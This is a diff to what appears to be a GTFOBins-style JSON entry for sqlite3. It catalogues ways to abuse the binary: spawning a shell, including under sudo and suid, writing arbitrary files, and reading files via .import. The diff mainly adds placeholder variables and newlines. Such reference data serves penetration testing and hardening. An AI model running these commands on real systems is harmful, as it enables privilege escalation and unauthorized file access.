@@ -2,32 +2,38 @@
   "functions": {
     "shell": [
       {
-        "code": "sqlite3 /dev/null '.shell /bin/sh'"
+        
+        "code": "sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ],
     "file-write": [
       {
-        "code": "sqlite3 /dev/null -cmd \".output [file]\" 'select \"DATA\";'\n"
+        
+        "code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n"
       }
     ],
     "file-read": [
       {
-        "code": "sqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import [file] t\nSELECT * FROM t;\nEOF\n"
+        
+        "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
       }
     ],
     "suid": [
       {
-        "code": "sqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import [file] t\nSELECT * FROM t;\nEOF"
+        
+        "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
+        
+        "code": "sudo sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "code": "./sqlite3 /dev/null '.shell /bin/sh'"
+        
+        "code": "./sqlite3 /dev/null '.shell /bin/sh'\n"
       }
     ]
   }
